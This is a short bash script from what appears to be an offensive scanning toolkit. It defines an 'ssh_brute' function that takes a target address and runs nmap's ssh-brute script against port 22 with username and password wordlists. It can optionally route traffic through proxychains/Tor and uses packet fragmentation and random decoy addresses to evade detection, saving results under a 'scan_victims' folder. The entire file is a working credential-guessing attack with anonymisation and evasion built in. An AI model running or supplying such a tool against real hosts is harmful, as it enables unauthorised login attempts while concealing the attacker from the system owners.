#! /bin/bash

source ./cyber_scan/lib/settings/services.sh
source ./cyber_scan/lib/scan/helpers/inputs.sh
source ./cyber_scan/validators/ipv4_validator.sh
source ./cyber_scan/lib/scan/helpers/create_dir.sh
source ./cyber_scan/lib/util/success_output.sh
source ./cyber_scan/assets/set_color.sh

function ssh_brute()
{
	services "SSH brute attack"

        proxychains_input
        if [[ $proxychains == [Yy] ]]; then
                is_tor="proxychains"
        else
                is_tor=""
        fi

        dns_input

	ipv4_validator "$dns"
        if [ $? -ne 0 ]; then
                return 1
        fi

	debug_mode
	if [[ $debug == [Yy] ]]; then
		debug_flag="-d"
	else
		debug_flag=""
	fi

        dir_input
        create_dir "$dir_name/attacks/ssh_brute"


	#echo "Trying to crack auth using nmap brute script..."
	$is_tor nmap -p22 --script=ssh-brute \
	 --script-args=userdb=users.lst,passdb=pass.lst,ssh-brute.timeout=4s $debug_flag \
	 -f --send-eth -D RND:3 \
	 -oN "scan_victims/$dir_name/attacks/ssh_brute/$dns.nmap" "$dns"

	success_output "$dir_name" "attacks/ssh_brute" "$dns.nmap"
}
